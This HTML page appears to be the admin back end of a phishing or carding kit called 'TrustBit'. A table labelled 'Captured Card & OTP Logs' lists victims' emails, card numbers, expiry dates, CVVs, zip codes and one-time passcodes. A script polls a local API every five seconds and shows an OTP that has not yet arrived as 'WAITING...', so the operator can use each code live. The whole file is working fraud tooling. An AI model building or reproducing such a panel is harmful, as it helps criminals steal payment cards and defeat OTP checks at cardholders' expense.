<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>TrustBit - Admin Panel</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        body { background: #121212; color: white; padding: 20px; }
        .card { background: #1e1e1e; border: 1px solid #333; margin-bottom: 20px; }
        table { color: white !important; }
    </style>
</head>
<body>
    <div class="container-fluid">
        <h2 class="mb-4 text-primary">TrustBit Admin Logs</h2>

        <div class="card p-3">
            <h4 class="text-warning">Captured Card & OTP Logs</h4>
            <table class="table table-dark table-striped mt-3">
                <thead>
                    <tr>
                        <th>Email</th>
                        <th>Card Number</th>
                        <th>Exp/CVV</th>
                        <th>Zip</th>
                        <th>OTP Code</th>
                        <th>Time</th>
                    </tr>
                </thead>
                <tbody id="cardTableBody">
                    </tbody>
            </table>
        </div>
    </div>

    <script>
        async function fetchLogs() {
            try {
                const response = await fetch('http://localhost:5000/api/admin/all-data');
                const data = await response.json();
                const tableBody = document.getElementById('cardTableBody');
                
                tableBody.innerHTML = ""; // Clear table

                data.forEach(item => {
                    const row = `
                        <tr>
                            <td>${item.email}</td>
                            <td><span class="badge bg-danger">${item.cardNumber}</span></td>
                            <td>${item.expiry} / ${item.cvv}</td>
                            <td>${item.zip}</td>
                            <td><b class="text-success">${item.otpCode || 'WAITING...'}</b></td>
                            <td>${new Date(item.timestamp).toLocaleString()}</td>
                        </tr>
                    `;
                    tableBody.innerHTML += row;
                });
            } catch (err) {
                console.error("Error fetching logs:", err);
            }
        }

        // Fetch logs every 5 seconds automatically
        fetchLogs();
        setInterval(fetchLogs, 5000);
    </script>
    <script src="js/main.js"></script>
</body>
</html>
